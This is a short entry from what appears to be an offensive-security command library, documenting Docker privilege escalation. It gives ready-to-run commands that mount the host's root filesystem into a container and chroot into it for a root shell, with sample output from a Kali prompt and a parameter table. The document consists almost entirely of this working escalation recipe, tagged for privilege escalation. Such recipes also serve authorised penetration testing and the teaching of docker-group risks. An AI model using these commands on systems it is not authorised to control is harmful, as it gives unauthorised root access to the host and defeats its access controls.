---
id: 074c76c5-56de-49ac-b522-4c7621c8a549
type: command
executor: bash
data: 'docker run -v /:/root_fs -i -t ubuntu bash'
output: |-
  alice@kali:~$ docker run -v /:/root_fs -i -t ubuntu bash
  Unable to find image 'ubuntu:latest' locally
  latest: Pulling from library/ubuntu
  ... 
  Status: Downloaded newer image for ubuntu:latest
  root@container:/# ls /root_fs/
  bin boot dev etc ...
created_at: '2019-10-09T19:15:07.838000+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - priv-esc
verified: true
validated: true
---

# Docker-Mount-Hosts-Root-Directory-in-Container

## Command

```bash
docker run -v /:/root_fs -i -t ubuntu bash
```

## Description

Runs a container mounting host root for priv esc.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -v /:/root_fs | Mount host / to container | Yes |
| -i -t | Interactive terminal | Yes |
| ubuntu | Image name | Yes |

## Examples

### Basic Mount

```bash
docker run -v /:/mnt -it ubuntu chroot /mnt /bin/bash
```

## Expected Output

Container shell with host filesystem access.

## Related

- [[procedures/Docker-Privilege-Escalation-Using-Docker-Group]]
